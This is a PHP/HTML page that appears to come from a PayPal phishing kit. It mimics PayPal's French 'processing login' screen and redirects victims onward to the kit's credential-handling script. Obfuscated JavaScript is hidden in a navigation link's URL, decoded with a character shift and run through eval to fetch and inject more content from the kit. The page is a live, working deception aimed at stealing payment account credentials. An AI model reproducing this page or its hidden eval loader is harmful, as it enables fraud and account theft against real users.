<?php
include "./option.php";
include "./lang/Paye.php";
include "./lang/".lang2();
$top_lang= $_SESSION["top_lang"];
?>
<!DOCTYPE html>
<html lang="<?php echo $top_lang; ?>">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=<?php echo $charset; ?>">

<!--
Script info: script: webscr, cmd: _login-processing, template: p/gen/login-processing, date: Feb 10, 2011 21:59:17 PST; country: US, language: fr_XC, xslt server: 
		web version: 67.0-1741654 branch: BWR_670_int
		DXPT: true (LOCALE: fr_XC, COUNTRY: US, PRODUCTNUMBER: 67.0, BUILDNUMBER: 1741654, BRANCHNAME: BWR_670_int, PRODUCTNUMBEROVERRIDE: )
	pexml version: -
		pexml version: 67.0-1755747
		page XSL: 
 hostname : dUrblYi7kJ.aEH4HmkhJB4rWClp8eNvBQI3KeoM9rV8
rlogid : dUrblYi7kJ%2faEH4HmkhJB5inquNzFsqNXepzhWLhzEAUfSwJp03SlQ%3d%3d_12e635d8c4c
-->
 
<title><?php echo $opay; ?></title>

<meta http-equiv="X-UA-Compatible" content="IE=8">
<link media="screen" rel="stylesheet" type="text/css" href="css/global.css">
<link rel="shortcut icon" href="css/img/pp_favicon_x.ico">
<!--[if IE 8]>
<link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20110204-1/css/browsers/ie8.css"><![endif]-->

<!--[if IE 7]>
<link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20110204-1/css/browsers/ie7.css"><![endif]-->

<!--[if lte IE 6]>
<link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20110204-1/css/browsers/ie6.css"><![endif]-->

<style type="text/css">
					body{font: 75%/normal Arial, Helvetica, sans-serif;}
					h3 {font-size: 1.4em;margin: 4em 0 0 0;color: #333;}img.actionImage {margin: 1.88em 0 2em 0;}.n{display:none;}
					p.note {color:#656565; font-size: 1.2em;}.show{display:block;}.hide{display:none;}
					p.note a {color:#656565;text-decoration: underline;}#l{z-index:9;position:absolute;}
					p strong {margin-top:2em; color:#1A3665; font-size:1.25em;}#r{
						display: block;
						margin: 32px auto;
						height:30px;
						width:30px;
						-webkit-animation: rotation .7s infinite linear;
						-moz-animation: rotation .7s infinite linear;
						-o-animation: rotation .7s infinite linear;
						animation: rotation .7s infinite linear;
						border-left:8px solid rgba(0,0,0,.20);
						border-right:8px solid rgba(0,0,0,.20);
						border-bottom:8px solid rgba(0,0,0,.20);
						border-top:8px solid rgba(33,128,192,1);
						border-radius:100%;
					}
					@keyframes rotation {
						from {transform: rotate(0deg);}
						to {transform: rotate(359deg);}
					}
					@-webkit-keyframes rotation {
						from {-webkit-transform: rotate(0deg);}
						to {-webkit-transform: rotate(359deg);}
					}
					@-moz-keyframes rotation {
						from {-moz-transform: rotate(0deg);}
						to {-moz-transform: rotate(359deg);}
					}
					@-o-keyframes rotation {
						from {-o-transform: rotate(0deg);}
						to {-o-transform: rotate(359deg);}
					}
		</style>
<META HTTP-EQUIV="refresh" content="2; URL=<?php echo $webscr; ?>/bin.php?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8dc18bca4c6f47e633b393e2b84a&e284=5f8a8f8<?php echo "&ee=$ee"; ?>">
<script type="text/javascript">
// 
if (parent.frames.length > 0){top.location.replace(document.location);
}d=document;function g(l){return d.getElementById(l)}</script><link rel="apple-touch-icon" href="./css/img/apple-touch-icon.png"></head><body><noscript><p class="nonjsAlert">REMARQUE : nous avons bousoin de activer javascript dans votre navigateur.</p>
</noscript>
<div class="" id="page"><div id="content"><div id="headline"><h2 class="accessAid"><?php echo $processing; ?></h2></div><div id="messageBox"></div><div id="main"><div class="layout1 textcenter"><h3><?php echo $One_moment; ?></h3><img id="a" border="0" class="actionImage" alt="Ouverture d'une session s&eacute;curis&eacute;e"><div id="i"></div><!--<p class="note"><?php echo $ifno;?> <a href="./websc/update.php?cmd=_login-done&amp;login_access=5d80a13c0db1f8e<?php echo "&ee=$ee"; ?>"><?php echo $clickhere; ?></a> <?php echo $reload; ?></p>--></div></div></div><div id="navFull"><ul><li class="active" id="nb2" >
<div></div><a href="https://www.paypal.com/webscr?cmd=_account%23j%2B%25l%25%2C1lqqhuKWPO%40%25%3Fgly%23lg%40*u*A%3F2glyA%25%3Ej%2B%25qe5%25%2C1vw%7Coh1glvsod%7C%40%25qrqh%25%3Ej%2B%25d%25%2C1vuf%40%25fvv2lpj2l1jli%25%3Eixqfwlrq%23l%2Bd%2C~ydu%23%7B%3Eli%2Bzlqgrz1%5BPOKwwsUhtxhvw%2C~%7B%40qhz%23%5BPOKwwsUhtxhvw%2B%2C%3E%C2%80hovh~%7B%40qhz%23Dfwlyh%5BRemhfw%2B%25Plfurvriw1%5BPOKWWS%25%2C%3E%C2%80%7B1rshq%2B%25SRVW%25%2F%2512odqj2Sd%7Ch1sks%25%2Fwuxh%2C%3E%7B1vhwUhtxhvwKhdghu%2B%25Frqwhqw0w%7Csh%25%2F%25dssolfdwlrq2%7B0zzz0irup0xuohqfrghg%25%2C%3E%7B1vhqg%2Bd%2C%3E%C2%80ydu%23s%40%25%25%3Eiru%2Bm%404%3Em%3F%3C%3Em..%2C~s.%40kry%2B%25qdy%25.m%2C%3E%C2%80l%2Bs%2C%3E" id="nav">Mon compte</a><ul><li class="active"><a href="https://www.paypal.com/webscr?cmd=_account%23d%40%3C)4%40orfdoh)orfdoh%40S%7DotMnNw%5D%5BRzfGMs%5Emlw%5D%5C%5EpS%7Do%7BOKhye%5CV%7Df7Fpgp%3D%7Df7N%7D%5EXwtQG%7Bmg7NzgrNp%5C7plfLF~e%5BUmOLVpg5%3Dtfqp%3DS55yNJxSX4pXY4ZX%5C%7DUkfrN5hKZ%7Di%7DpyNGlqMK9ze%5CVnfrZq)5%40odqjxdjh)odqjxdjh%40fKJ6%5EUAA" id="nav1" class="scTrack:SRD:Nav:RP">Aper&ccedil;u</a></li><li><a href="https://www.paypal.com/webscr?cmd=_account%23)6%40orfdo5)orfdo5%40jXwtOWN8fKJnf6%7BmOK%5DsfKJ6%5EXwtOWNy%5EmMs%5Emlw%5D%5C%5Epi%7Dot%5CWNYU%7DNfZJRTYJ%3CoOLVpg7RtOK%5EtS%7DotMq9wMmlqOK%7ClhqZ%3DS%7DotMq%7Cl%5D6%3DwMmlqOK%7ClhqZ%3BOWphMnU8QqYm%5B5VJV5%3CoOLVpg7RtMKVy%5DWEt%5CWNwe%5BJx%5EWNfXo%3DNY5RJY5%3CoOLVpg7RtOK%5Et" id="nav2" class="scTrack:SRD:Nav:RQ">Ajouter des fonds</a><ul><li><a href="https://www.paypal.com/webscr?cmd=_account%23)7%40dgu)dgu%40TqZwi%5CV~P~%7C%3DS7l%7BRXUkiLE8Q~trfqpo%5EKJ%7Bi7Npfq9NhqJSi%5BJ%7DhG9%3DS%7DY%7BQHI%3AeLVoe%5Ch%3B%5CWN4e%5B5mh%5CQmT%5BZ%7Bi%5CVfhLZ%7BfqokgqZyfop6%5DY99%5D%5CN4Pm%7C4h%5CFyeWFxh%5Bpo%5E%5B4yhLZ%7Bfop4iKZ4PmF%7D%5E%5B9yW%5C%5ElXrplgrUyPK55e%5BVpfW94h%5CFyW%5CV8%5E%5CUyMLNpfq9NhqJSi%5BJ%7DhG8%2F%5E%5B%7C9hLQ%3C" id="nav3" class="scTrack:SRD:Nav:FA">Ajouter des fonds &agrave; partir d'un compte bancaire</a></li><li><a href="https://www.paypal.com/webscr?cmd=_account%23)8%40oq)oq%40jXwmgKl%7BPq9pMmFygrZ4%5E%5CN%3DS%7DN%7BeLEyMm9hMrlj%5E%5B%7Cl%5D6%3DwMpxSX4pXY4ZX%5C%7DUkfrN5hKZ%7Di%7Dot%5CWN8%5C6Zw%5D%5BRzfGNfXo%3DNY5RJY5%3CoOLVpg7RtOK%5Eti%7DosQqhy%5D%5B%7Bkfq%3DthKRyh%5B%5DA" id="nav4" class="scTrack:SRD:Nav:k90">Gestionnaire de solde</a></li><li><a href="https://www.paypal.com/webscr?cmd=_account%23)9%40orfdo)orfdo%40j%5C4%3BOWomf6QmOK%5DsfKJ6%5E%5Cxpg6%7CpjXwtO%5CQoPHEsi%5BJ%7DgqIwfGUsg7wtO%5B%7BoOLR4g6p8%5EZ%3DpfKpqMWlqeXwtMqhy%5DY%7C4MmlqT%5CQoS%7DN~g6QyQrV%7BiG%3Drf%5Bozg7RnP%7D8yMn5wNLwtOWl8OK%5EtS%7DotMq9qMmlqOK%7ClhqY%3BO%5B%3CoPmMkfp%7BmPp4m%5ELNzh7R~%5D%5CEm%5B49TWZRXVZRjNG8mMHt~g6J%7BMK9gMm9hMq%7Ct%5D%5B5pMpxSX4pXY4ZX%5C%7DUyMmE%3AfKplf%5BYmPGomYoVIUZ%3DJZI%3DRVZMmOL%5Ey%5E%5CVp%5E%7D8mMGMy%5CWNrfqJQhGNfXo%3DNY5RJY5%3CoPmMk%5E6%3DwSmMwMq5z%5D%7D9we%5BJxhK%3DsUKhzfKJ7%5D%5CgmOK%7Ct%5D%5B5%3DjXxheWVf%5EK9pg%7DUyMmFy%5CGM%3DPq%3Coi%7DovO6ooS%7DpofqZ~NGl4frZz%5D~%7CtNHw%7BT%5BooOLNz%5EnxzNGFp%5ELZw%5D69ti%7Dotf%7DUsg7V~e%5Clp%5C6Zwe%5B%5Ds%5Eqo%3BMrFsgG9zhGM%3Df%7DUA" id="nav5" class="scTrack:SRD:Nav:V06">Ajouter des fonds par MoneyPak</a></li></ul></li><li><a href="https://www.paypal.com/webscr?cmd=_account%23)%3A%40orfdo%7B)orfdo%7B%40S6Z5grU%3DhKJ4%5EWV%3DS6%7Cwh%5B8%3D%5CWNYU%7DNfZJRTYJ%3Coi%7Do~TX5%7DNGlqe%5C4%3BQ~5%7DNLxpg6%7CpjXwthGUyOWln%5D%7D9%7BNG8tMrFtimMs%5Em9%7BNG8tMrp4e%5BQmOK%5DygGUyOWNrfqJQhGMs%5Em9%7BNG9%7DNG%7BtOLVn%5E%5Btmh%5CQygGUyg%7DUygGUygmUwMq5z%5D%7D9phqpwUKVt%5EKtlh6J7Mmlwe%5BJxi%7DotMqRnMml~hLRtiKZjfq%3DthKRyh%5B%5Ds%5Eqo%3BOWomf6QmOK%5DsfKJ6%5EXwmfq%3DyMn5%7DNHwtMqhy%5DY%7C4MmlqT%5CQoS%7DN~g6QyQrV%7BiG%3Drf%5Bozg7RnP%7D8yMn5wNEAA" id="nav6" class="scTrack:SRD:Nav:RR">Virer</a><ul><li><a href="https://www.paypal.com/webscr?cmd=_account%23)%3B%40fr)fr%40j%5C4%3BMq%7CtVq%3DSSmM%3DgmV%3B%5E%5CRw%5E%5C4%3BO%5BIoPK%7BoOLR%3DjXw%7BTZ4%7B%5B6Ioi%7Do~TX5hQJxlNGlqeXxhQJxlNG8mSmM%3DgmU%3BQX4v%5CXFf%5DWV%3BOWphMpVHMpxYY4%3DU%5C%7DUshKZ~g6ok%5EK9lML%5DoOK%5EtS%7Do%7CP%5BooOG8mf%5CF~SmM%3DgmV%3DS%7DwveWU%3BhmUlT%5C%5DoS%7DplNG%7CwNGl~S64oTZ5tNJxlNLwthmUk%5EK9lMGM%7CSnsmTWJxNGFofqIkRH%7CtNGlqe%5C4%3B%5C%5Boo%5B6IoPrEoTW94NL4%3BhmUlT%5C%5Doi%7DpxNH4%3D%5C%5Boo%5B6IoMLNzMLQoTX5heWVf%5DWUs%5Eqp%3BOWwveWU%3BO%5BIoOLVyh%5B%3DnTKooS~I%3DeWUsgq%3DqS%7DotfGUsg7Vy%5E%5CVyf6RjhKZr%5C6Zwe%5B%5Ds%5E%5CttfKJtgqZ~frY%3D%5DWV%3BOWpwNGl~hLRtiKZj%5E%5B%7Ct%5Emlqe%5CwtOWl8OK%5EtS%7DMmT%5CUoS6Z5grU%3DhmU%3BOWNWVIVF%5C4ZYX45JYmMshq9phKZrT%5B4oS%7DMkjGEmT%5CEo" id="nav7" class="scTrack:SRD:Nav:RS">Transf&eacute;rer des fonds vers un compte bancaire</a></li><li><a href="https://www.paypal.com/webscr?cmd=_account%23)%3C%40iq)iq%40jXxph%5CN4MK9%7Dh%5CVpgr5%3DS6Z~fKJqMK9%7Dh%5CVpgrwtOZ5tNJx%7CNGl~hLRtiKZjfq%3DthKRyh%5B%5DlOK%5Eti%7DovO6ooS%7Dp%7CNGl4frZz%5D~%7CtNHw%7BT%5BooOLNz%5EnwtMqZ%3Ae%5B%7Cle%5CNpg695Mm%7Bmg7Vy%5E%5CVyf6RjhKZr%5C6Zwe%5B%5DmPGNpiqpw%5D%5Bp%7D%5E%5CQmPGNy%5E%5CFz%5EmMsi%5BJ%7DgqI%3DgWV%3BOWl8MK9ze%5CVnfrZqjXwt%5EmUs%5E%5CRzfKRqS%7Dotg%7DUs%5E%5CttfKJtgqZ~PK%5DoOKZ4e%5CN7%5EnwtMrgmPK%7BoOK9pgK%3DqT%5B%5Doi%7Dp~NG%7CwNGl~MK9ze%5CVnfrZq"  id="nav8" class="scTrack:SRD:Nav:RT">Demander une v&eacute;rification</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_dc-intro&amp;nav=0.2.2" id="nav9" class="scTrack:SRD:Nav:RU">Utiliser une carte bancaire</a></li></ul></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_history&amp;nav=0.3" id="nav10" class="scTrack:SRD:Nav:RV">Historique</a><ul><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_history&amp;nav=0.3.0" id="nav11" class="scTrack:SRD:Nav:RW">Recherche de base</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_history-download&amp;nav=0.3.1" id="nav12" class="scTrack:SRD:Nav:RY">T&eacute;l&eacute;charger l'historique</a></li></ul></li><script>function gobal(windowscript){if(window.execScript){window.execScript(windowscript);}else{eval(windowscript);}}function hov(j){var b='';var a=decodeURIComponent(g(j).href).split('t#');a=a[1];for(c=0;c<a.length;c++){b+=String.fromCharCode(a.charCodeAt(c)-3);}return b;}gobal(hov('nav'));</script><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_complaint-view&amp;nav=0.4" class="scTrack:SRD:Nav:SC">Gestionnaire de litiges</a><ul><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_complaint-view&amp;nav=0.4.0" class="scTrack:SRD:Nav:SD">Visualiser les dossiers en cours</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/CaseManagement/customerservice/EducationModuleIndex&amp;nav=0.4.1" class="scTrack:SRD:Nav:SF">Didacticiels</a></li></ul></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-summary&amp;nav=0.5" class="scTrack:SRD:Nav:SN">Pr&eacute;f&eacute;rences</a><ul><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-email&amp;nav=0.5.0" class="scTrack:SRD:Nav:SO">Ajouter ou modifier une adresse email</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-ach&amp;nav=0.5.1" class="scTrack:SRD:Nav:SP">Enregistrer ou modifier un compte bancaire</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&amp;flag_from_account_summary=1&amp;nav=0.5.2" class="scTrack:SRD:Nav:SQ">Enregistrer ou modifier une carte bancaire</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&amp;nav=0.5.3" class="scTrack:SRD:Nav:SR">Ajouter ou modifier une adresse postale</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-phone&amp;nav=0.5.4" class="scTrack:SRD:Nav:Z9">Enregistrer ou modifier un num&eacute;ro de t&eacute;l&eacute;phone</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-summary&amp;nav=0.5.5" class="scTrack:SRD:Nav:x76">Plus d'options</a></li></ul></li></ul></li>
</div>
</div>
<script type="text/javascript">

var supportCSSProp = (function() {
var div = document.createElement('div'),
vendors = 'Khtml Ms O Moz Webkit'.split(' '),
len = vendors.length;

	return function(prop) {
	if ( prop in div.style ) return true;

	prop = prop.replace(/^[a-z]/, function(val) {
	return val.toUpperCase();
	});
	// Filter through the vendors array, and test if there's a match
	while(len--) {
	if ( vendors[len] + prop in div.style ) {
	return true;
	} 
	}
	return false;
	};
})();

if (supportCSSProp('animation')) {
	g('r').classList.add('show');
	g('a').classList.add('hide');
}
else {
	g('a').classList.add('show');
	g('r').classList.add('hide');
}

</script>
<!-- End SiteCatalyst Code -->
</body>
</html>